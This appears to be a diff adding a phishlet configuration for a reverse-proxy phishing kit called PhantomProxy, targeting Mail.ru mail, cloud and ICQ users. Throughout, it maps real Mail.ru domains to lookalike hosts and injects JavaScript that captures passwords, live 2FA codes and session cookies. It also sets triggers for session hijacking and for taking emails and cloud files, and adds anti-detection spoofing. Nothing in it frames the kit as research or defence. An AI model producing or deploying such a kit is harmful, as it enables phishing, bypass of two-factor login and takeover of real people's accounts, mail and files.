@@ -1,0 +1,253 @@
+# ============================================================================
+# Mail.ru Phishlet
+# Полный перехват сессий Mail.ru Group
+# ============================================================================
+
+id: mailru
+name: Mail.ru (Mail/Cloud/ICQ)
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Перехват сессий Mail.ru Group:
+  - Почта Mail.ru
+  - Облако Mail.ru
+  - ICQ
+  - Мой Мир
+  - VK WorkSpace
+
+target:
+  primary: "e.mail.ru"
+  secondary:
+    - "account.mail.ru"
+    - "login.mail.ru"
+    - "cloud.mail.ru"
+    - "icq.com"
+    - "www.icq.com"
+    - "my.mail.ru"
+    - "o2.mail.ru"
+    - "auth.mail.ru"
+
+sub_filters:
+  - type: "domain"
+    from: "e.mail.ru"
+    to: "e.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "account.mail.ru"
+    to: "account.phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "login.mail.ru"
+    to: "login.phantom-proxy.com"
+    priority: 3
+    
+  - type: "domain"
+    from: "cloud.mail.ru"
+    to: "cloud.phantom-proxy.com"
+    priority: 4
+    
+  - type: "domain"
+    from: "icq.com"
+    to: "icq.phantom-proxy.com"
+    priority: 5
+    
+  - type: "domain"
+    from: "my.mail.ru"
+    to: "my.phantom-proxy.com"
+    priority: 6
+
+  - type: "domain"
+    from: "imgsmail.ru"
+    to: "img.phantom-proxy.com"
+    priority: 100
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] Mail.ru phishlet loaded');
+    
+    const mailruCapture = {
+      // Перехват credentials
+      captureCredentials: function(form) {
+        const email = form.querySelector('input[type="email"]')?.value || 
+                      form.querySelector('input[name="email"]')?.value ||
+                      form.querySelector('input[type="text"]')?.value || '';
+        const password = form.querySelector('input[type="password"]')?.value || '';
+        
+        if (email || password) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'mailru_credentials',
+              email: email,
+              password: password,
+              url: window.location.href,
+              timestamp: Date.now()
+            })
+          });
+        }
+      },
+      
+      // Перехват 2FA
+      capture2FA: function(code) {
+        if (code && code.length >= 4) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'mailru_2fa',
+              code: code,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват сессии
+      captureSession: function() {
+        const cookies = {
+          mrcu: this.getCookie('mrcu'),
+          mrcu_params: this.getCookie('mrcu_params'),
+          sdc: this.getCookie('sdc'),
+          mrshuk: this.getCookie('mrshuk'),
+          sess: this.getCookie('sess'),
+          csrf: this.getCookie('csrf')
+        };
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'mailru_session',
+            cookies: cookies,
+            url: window.location.href
+          })
+        });
+      },
+      
+      getCookie: function(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return '';
+      }
+    };
+    
+    // Перехват форм
+    document.addEventListener('submit', function(e) {
+      const form = e.target;
+      if (form.action && form.action.includes('mail.ru')) {
+        mailruCapture.captureCredentials(form);
+      }
+    }, true);
+    
+    // Перехват input
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT') {
+        const name = e.target.name || e.target.id;
+        if (name.includes('code') || name.includes('otp') || name.includes('verify')) {
+          if (e.target.value.length >= 4) {
+            mailruCapture.capture2FA(e.target.value);
+          }
+        }
+      }
+    }, true);
+    
+    // Захват при загрузке
+    window.addEventListener('load', function() {
+      mailruCapture.captureSession();
+    });
+    
+    // Скрытие
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+    
+  })();
+
+triggers:
+  - name: "mailru_login"
+    path_regex: "/login|/auth|/authorization"
+    actions:
+      - type: "inject_js"
+        payload: "mailru_login.js"
+      - type: "capture_form"
+        fields: ["email", "password", "passwd", "Username"]
+        
+  - name: "mailru_2fa"
+    path_regex: "/code|/verify|/twoFactor|/sms"
+    actions:
+      - type: "capture_form"
+        fields: ["code", "verification_code", "sms_code", "mfa_code"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  - name: "mailru_inbox"
+    host_regex: "e.mail.ru"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["mrcu", "sdc", "sess", "csrf"]
+      - type: "session_hijack"
+        enabled: true
+      - type: "capture_emails"
+        enabled: true
+        
+  - name: "mailru_cloud"
+    host_regex: "cloud.mail.ru"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["mrcu", "sdc", "sess"]
+      - type: "capture_files"
+        enabled: true
+
+cookies:
+  critical:
+    - "mrcu"
+    - "mrcu_params"
+    - "sdc"
+    - "mrshuk"
+    - "sess"
+    - "csrf"
+    
+  session:
+    - "L"
+    - "K"
+    - "J"
+    - "i"
+    
+  additional:
+    - "mailru_sso"
+    - "icq_session"
+
+headers:
+  - "Authorization"
+  - "X-CSRF-Token"
+  - "X-Mailru-Sso"
+
+anti_detection:
+  hide_webdriver: true
+  spoof_navigator: true
+  anti_devtools: true
+  random_timings: true
+  canvas_spoof: true
+  timezone_spoof: "Europe/Moscow"
+  language_spoof: "ru-RU"
+
+performance:
+  cache_static: true
+  compress_responses: true
+  lazy_images: true
+  minify_js: true
+  enable_brotli: true
+
+ssl:
+  min_version: "TLS1.2"
+
+logging:
+  log_requests: true
+  log_responses: true
+  log_errors: true
+  log_path: "./logs/mailru/"
+  log_timezone: "Europe/Moscow"
